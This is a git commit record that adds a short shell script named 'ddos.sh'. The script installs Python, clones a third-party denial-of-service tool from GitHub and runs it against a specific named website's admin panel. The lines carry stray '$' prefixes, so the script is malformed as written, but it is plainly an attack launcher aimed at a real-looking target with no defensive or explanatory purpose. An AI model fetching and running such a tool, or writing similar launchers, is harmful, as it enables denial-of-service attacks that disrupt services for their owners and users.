8037e35f92bb22dd87305ddc46908ca974a5121f
admin123356 <85184761+admin123356@users.noreply.github.com>
2021-06-22 16:05:49 +0700

    Create ddos.sh

---
+++ ddos.sh
@@ -0,0 +1,9 @@
+$apt update && apt upgrade
+$apt install python
+$apt install python2
+$apt install git
+$git clone https://github.com/MrTamfanX/MCIDDOS
+$cd MCIDDOS
+$ls 
+$python2 TamfanDdos.py
+$python2 TamfanDdos.py http://adminpanel.paxel.co:80
